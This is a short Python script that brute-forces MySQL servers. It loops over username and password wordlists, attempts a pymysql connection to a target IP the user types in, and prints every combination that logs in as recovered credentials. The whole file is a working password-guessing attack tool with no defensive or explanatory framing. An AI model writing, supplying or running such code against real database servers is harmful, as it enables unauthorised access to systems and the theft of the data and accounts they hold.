import pymysql

user_name = open('users.txt','r+')
user = user_name.readlines()
passwords = open('passwords.txt','r+')
pas = passwords.readlines()

def brute_forcer(username,passwd,target):
    baglanti = pymysql.connect(host=target.strip(),user=username.strip(),password=passwd.strip())#db='' eklenir hedef database için
    baglanti = baglanti.cursor()

if __name__=='__main__':
    print("TARGET")
    target_ip = input("[IP]:")
    credentials = []
    for i in user:
        for j in pas:
            try:
                brute_forcer(i,j,target_ip)
                credentials.append(i.strip()+":"+j.strip())
            except:
                print("[-]"+i.strip()+":"+j.strip()+" login failed")
    print("*** CREDENTIALS ***")
    for k in credentials:
        print("[+]"+k)
    print("*******************")
